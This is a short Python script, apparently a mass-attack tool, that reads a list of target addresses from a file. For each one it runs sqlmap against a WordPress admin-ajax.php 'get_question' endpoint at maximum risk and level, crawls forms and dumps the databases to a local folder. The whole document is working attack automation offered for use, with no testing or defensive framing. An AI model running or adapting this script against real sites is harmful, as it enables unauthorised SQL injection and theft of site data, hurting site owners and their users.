import sys, threading, os

def loligang(input_file):
	input_file = open(sys.argv[1])
	for i in input_file.readlines():
		ip = i.strip("\n")
		try:
			print("______________________________________________________")
			print("[+]Exploiting Wordpress: " + ip + " [+]")
			hydrocodone = ('python.exe map\sqlmap.py --batch -u "'+ip+'wp-admin/admin-ajax.php?action=get_question&question_id=1" --risk=3 --level=5 --answers=Y --forms --crawl=2 --dump --output-dir=C:\Users\root\Desktop\DUMPPPP') # sqli dump
			print(hydrocodone)
			os.system(hydrocodone)
			print("\n ### DONE ###")
			print("______________________________________________________")
		except:
			pass
	input_file.close()
if __name__ == "__main__":
	x = threading.Thread(target=loligang, args=(1,))
	x.start()
